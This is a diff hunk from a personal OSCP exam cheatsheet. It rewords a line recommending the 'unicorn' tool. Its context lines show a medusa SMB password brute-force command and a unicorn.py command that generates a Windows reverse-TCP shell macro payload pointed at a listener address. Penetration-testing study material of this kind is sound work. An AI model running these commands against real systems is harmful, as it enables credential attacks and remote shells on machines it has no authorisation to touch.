@@ -14,7 +14,7 @@ This is my personal OSCP cheatsheet that also "hopefully" would let me pass my e
     medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4				
 
 ## MACRO PAYLOAD
-**UNICORN.PY** Great tool u NEED to use in your OSCP journey https://github.com/trustedsec/unicorn
+**UNICORN** is a great tool u NEED to use in your OSCP journey https://github.com/trustedsec/unicorn
 
     python unicorn.py windows/x64/shell_reverse_tcp 11.1.1.151234 macro
     
